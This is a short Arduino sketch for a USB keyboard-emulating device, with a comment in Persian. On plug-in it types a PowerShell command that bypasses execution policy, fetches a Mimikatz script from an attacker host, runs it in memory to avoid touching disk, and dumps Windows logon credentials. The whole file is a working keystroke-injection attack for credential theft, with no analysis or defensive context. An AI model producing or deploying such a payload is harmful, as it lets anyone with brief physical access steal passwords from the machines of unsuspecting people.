#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  // دانلود و اجرای Mimikatz در مموری (بدون ذخیره روی دیسک)
  Keyboard.println(F("powershell -ep bypass (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; iex(irm http://attacker.tld/mimikatz.ps1); Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'"));
}
